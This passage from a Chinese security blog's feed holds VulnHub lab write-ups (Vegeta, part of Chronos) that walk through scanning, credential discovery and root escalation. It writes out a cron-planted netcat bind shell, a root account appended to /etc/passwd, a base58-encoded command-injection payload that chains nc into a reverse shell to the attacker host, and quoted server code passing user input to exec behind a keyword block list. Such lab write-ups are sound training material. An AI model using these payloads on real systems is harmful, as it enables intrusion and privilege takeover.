<p>可以看到不断反复的执行/home/ganimedes/phobos，并且还是以root执行的。但是在对应目录下并不存在该文件。</p>
<p>因此，可以创建一个对应文件： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash -lvp 6666&quot;</span> &gt; /home/ganimedes/phobos</span><br></pre></td></tr></table></figure></p>
<p>接着在kali上监听对应端口，也需要等待一会。</p>
<h1 id="总结">3. 总结</h1>
<p>该靶机把常见的多个提权的方法都涉及了：</p>
<ol type="1">
<li>sudo</li>
<li>mysql</li>
<li>suid</li>
<li>命令文件泄露</li>
<li>crontab</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>samba漏洞</tag>
        <tag>mysql提权</tag>
        <tag>crontab提权</tag>
        <tag>suid提权</tag>
      </tags>
  </entry>
  <entry>
    <title>30 Vulnhub Vegeta Writeup</title>
    <url>/2022/05/08/30%20Vulnhub%20Vegeta%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/vegeta-1,501/">Vegeta: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<p>目标：</p>
<ul>
<li>获取root权限</li>
<li>拿到1个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>路径枚举</li>
<li>摩斯密码</li>
<li>数据编码还原</li>
<li>二维码解码</li>
<li>权限提升</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.34</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.34</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508173725.png" /></p>
<h2 id="http服务-get-shell">2.2. http服务 + get shell</h2>
<p>主页面是一张图片，然后什么都没有了。尝试访问robots.txt，得到一个提示： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/find_me</span><br></pre></td></tr></table></figure></p>
<p>接着访问/find_me，找到一个find_me.html，页面很空，但是查看源码并滑到最后面，得到如下base64编码的字符串 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== --&gt;</span><br></pre></td></tr></table></figure></p>
<p>放入<a href="https://icyberchef.com/">CyberChef</a>，使用magic模块</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508193202.png" /></p>
<p>尝试使用这个密码去登录ssh，试了vegeta相关的各个用户名，都无法登录。</p>
<p>没有办法，接下来进行路径扫描，但是得到的文件和目录也都没有有用的信息，可能还有隐藏路径，因此换一个大字典 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.34/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508205453.png" /></p>
<p>扫出了一个目录/bulma，里面是一个音频文件，听内容应该是莫斯密码，使用下面的网址进行破解</p>
<ul>
<li><a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html?msclkid=0a38470ecebd11ec9d8b5a66adb8a09c">Morse Code Adaptive Audio Decoder | Morse Code World</a></li>
</ul>
<p>破解的结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER : TRUNKS PASSWORD : US3R(S IN DOLLARS SYMBOL)</span><br></pre></td></tr></table></figure></p>
<p>根据这个意思真实的信息应该是：（摩斯密码不区分大小写） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: trunks</span><br><span class="line">password: u$3r</span><br></pre></td></tr></table></figure></p>
<p>直接利用ssh登录</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508193642.png" /></p>
<h2 id="权限提升">2.3. 权限提升</h2>
<p>查看/home/trunks/.bash_history，内容很少： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -le ‘print crypt(“Password@973″,”addedsalt”)’</span><br><span class="line">perl -le &#x27;print crypt(&quot;Password@973&quot;,&quot;addedsalt&quot;)&#x27;</span><br><span class="line">echo &quot;Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd[/sh]</span><br><span class="line">echo &quot;Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</span><br><span class="line">ls</span><br><span class="line">su Tom</span><br><span class="line">ls -la</span><br><span class="line">cat .bash_history </span><br><span class="line">sudo apt-get install vim</span><br><span class="line">apt-get install vim</span><br><span class="line">su root</span><br><span class="line">cat .bash_history </span><br><span class="line">exit</span><br></pre></td></tr></table></figure></p>
<p>根据内容，好像直接往/etc/passwd内添加了一个root用户，并且成功切换过去了。因此可能当前用户对/etc/passwd有写的权限，查看以下 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">trunks@Vegeta:~$ ls -l /etc/passwd</span><br><span class="line">-rw-r--r-- 1 trunks root 1486 May  8 16:54 /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p>trunks居然是该文件的属主，那接下来就很简单了。直接再次执行 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p>然后利用john破解 ad7t5uIalqMws，得到密码为Password。（当然也可以自己设置密码）</p>
<p>然后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">trunks@Vegeta:~$ su Tom</span><br><span class="line">Password: </span><br><span class="line">root@Vegeta:/home/trunks<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
<p>成功拿到root权限。</p>
<p>最后读取/root/root.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">                               ,   ,&#x27;|</span><br><span class="line">                             ,/|.-&#x27;   \.</span><br><span class="line">                          .-&#x27;  &#x27;       |.</span><br><span class="line">                    ,  .-&#x27;              |</span><br><span class="line">                   /|,&#x27;                 |&#x27;</span><br><span class="line">                  / &#x27;                    |  ,</span><br><span class="line">                 /                       ,&#x27;/</span><br><span class="line">              .  |          _              /</span><br><span class="line">               \`&#x27; .-.    ,&#x27; `.           |</span><br><span class="line">                \ /   \ /      \          /</span><br><span class="line">                 \|    V        |        |  ,</span><br><span class="line">                  (           ) /.--.   &#x27;&#x27;&quot;/</span><br><span class="line">                  &quot;b.`. ,&#x27; _.ee&#x27;&#x27; 6)|   ,-&#x27;</span><br><span class="line">                    \&quot;= --&quot;&quot;  )   &#x27; /.-&#x27;</span><br><span class="line">                     \ / `---&quot;   .&quot;|&#x27;</span><br><span class="line">  V E G I I T A       \&quot;..-    .&#x27;  |.</span><br><span class="line">                       `-__..-&#x27;,&#x27;   |</span><br><span class="line">                     _.) &#x27; .-&#x27;/    /\.</span><br><span class="line">               .--&#x27;/----..--------. _.-&quot;&quot;-.</span><br><span class="line">            .-&#x27;)   \.   /     _..-&#x27;     _.-&#x27;--.</span><br><span class="line">           / -&#x27;/      &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;         ,&#x27;-.   . `.</span><br><span class="line">          | &#x27; /                        /    `   `. \</span><br><span class="line">          |   |                        |         | |</span><br><span class="line">           \ .&#x27;\                       |     \     |</span><br><span class="line">          / &#x27;  | ,&#x27;               . -  \`.    |  / /</span><br><span class="line">         / /   | |                      `/&quot;--. -&#x27; /\</span><br><span class="line">        | |     \ \                     /     \     |</span><br><span class="line">         | \      | \                  .-|      |    |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hurray you got root</span><br><span class="line"></span><br><span class="line">Share your screenshot in telegram : https://t.me/joinchat/MnPu-h3Jg4CrUSCXJpegNw</span><br></pre></td></tr></table></figure></p>
<h1 id="番外">3. 番外</h1>
<h2 id="二维码解码">3.1. 二维码解码</h2>
<p>注释中的字符串经过两次base64解码之后会得到PNG的文件头，将内容导出为png图片，会发现是一个二维码，接下来可以使用cyberchef的parse QR code进行处理，也可以使用zbarimg工具进行处理。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508210711.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(m1ku㉿kali)-[~/Downloads]</span><br><span class="line">└─$ zbarimg -q a.png</span><br><span class="line">QR-Code:Password : topshellv</span><br></pre></td></tr></table></figure>
<p>得到的是同样的结果。 ## 3.2. 摩斯密码音频解密 除了使用在线工具之外，还可以使用音频软件获取音频信息。推荐audacity。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508211009.png" /></p>
<p>短的代表. ；长的代表- ； 中间间隔比较长说明换一个字符了。</p>
<p>然后配合摩斯密码表解密，得到的结果和在线工具是一样的。</p>
<h2 id="生成密码写入etcpasswd">3.3. 生成密码写入/etc/passwd</h2>
<p>之前某台靶机，我尝试随便写入一个密码到/etc/passwd中，发现失败了，尝试如下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508211250.png" /></p>
<p>但是，使用openssl生成的加密字符串可以用作密码 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd 123</span><br><span class="line">-&gt; if13Dpsyoylmc</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508211409.png" /></p>
<h1 id="总结">4. 总结</h1>
<p>该靶机难度不高，主要的难点在于路径扫描比较恶心，全部扫描完要好久。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>摩斯密码</tag>
        <tag>二维码解码</tag>
      </tags>
  </entry>
  <entry>
    <title>3. Vulnhub Chronos Writeup</title>
    <url>/2022/04/01/3.%20Vulnhub%20Chronos%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度简单。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
<p>难度：Easy</p>
<p>虚拟机软件：Virtual Box</p>
<p>目标：取得2个flag，获得root权限</p>
<p>涉及的攻击方法：</p>
<ul>
<li>端口扫描</li>
<li>web侦察</li>
<li>命令注入</li>
<li>数据编、解码</li>
<li><strong>搜索大法</strong></li>
<li><strong>框架漏洞利用</strong></li>
<li>代码审计</li>
<li>NC串联</li>
<li>本地提权</li>
</ul>
<h1 id="渗透">渗透</h1>
<p>攻击主机 kali：<code>192.168.137.104</code></p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">如果实际的子网掩码是24位，那么上面查询的时候就减8，也就是16。实际查询的子网掩码位数设置为实际的子网掩码位数减8效果最好。</span><br></pre></td></tr></table></figure>
<p>原理：与前面的两者相同，都是通过ARP解析</p>
<p>结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
<p>因此，靶机的IP为 192.168.137.105</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
<p>信息：</p>
<ol type="1">
<li>22端口上的服务为openssh</li>
<li>80端口上的服务为http，版本为 2.4.29</li>
<li>8000端口上的服务也是http，但是用的 <code>node.js express framework</code></li>
<li>系统为Ubuntu</li>
</ol>
<h2 id="访问http服务">访问http服务</h2>
<p>有三件事必须做：</p>
<ol type="1">
<li>抓包</li>
<li>看源码</li>
<li>扫目录</li>
</ol>
<p>发现80端口和8000端口很类似（一个朴素，一个华丽），源码是一样的，其中有一串特殊的字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
<p>乍一看，好像是加密的js代码。这里推荐一个网址，可以对代码进行美化和编码解码：https://gchq.github.io/CyberChef/</p>
<p>利用<code>javascript beautify</code>模块美化之后虽然看的很清楚了，但是因为各种参数都加密了还是无法直到这段代码的意思。但是其中有一串字符没有加密： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
<p>最后，抓包看一下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
<p>发现确实有数据包往 chronos.local:8000 地方发送，但是我们无法用浏览器直接访问，因为kali并不知道chronos.local是哪台主机，但是我们知道，这应该就是靶机。因此，修改<code>/etc/hosts</code>，添加一条记录：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
<p>然后可以访问了，并且页面发生了变化。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
<p>结合url分析，发现url中的那一串字符像是警告base64编码的，因此，再次利用刚刚的网址进行解码。利用 <code>magic</code> 模块进行解码，发现是base58编码。得到解码后的结果：<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
<blockquote>
<p>base系列有许多，但是常见的是base64和base32。还有许多不常见的，比如这里的base58。</p>
</blockquote>
<ol type="1">
<li>date</li>
<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
<li>页面上显示的时间信息</li>
</ol>
<p>这让我想到Linux中的date命令，也是能够显示时间，因此在kali上尝试一下如下代码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
<p>发现结果和页面显示的一模一样（未经过渲染）。因此，有理由怀疑后台服务调用了系统命令，并且后台代码可能如下（猜测，并不是真正的代码，只是说明代码逻辑）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
<p>如果我们什么都不修改，那么执行的命令就是<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>，因此，我们可以考虑到Linux中以下执行多条命令（上周使用的是管道符，这周使用 <code>$$</code>，该符号只有在前面的命令正确执行的情况下，才会执行后面的命令）</p>
<p>先做一个尝试， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
<p>成功执行，因此这里确实调用了系统命令。接下来使用nc串联来反弹shell（先判断是否有nc，然后再判断是否有 -e）</p>
<h2 id="反弹shell">反弹shell</h2>
<p>首先在kali上启动两个监听端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>然后将payload base58编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
<p>虽然提示出错，但是kali已经成功连接上了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
<p>接下来进行信息收集：</p>
<p>发现在 <code>/home/imera</code> 目录下有一个<code>user.txt</code>文件，但是却没有权限读取，这应该就是其中一个flag了。并且在<code>/root</code>目录下也有一个flag，这应该是第二个flag，不出意料也没有权限读取。</p>
<p>还可以看一下 <code>app.js</code> <code>package.jsom</code> 和 <code>package-lock.json</code> 的内容，其中第一个的源码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		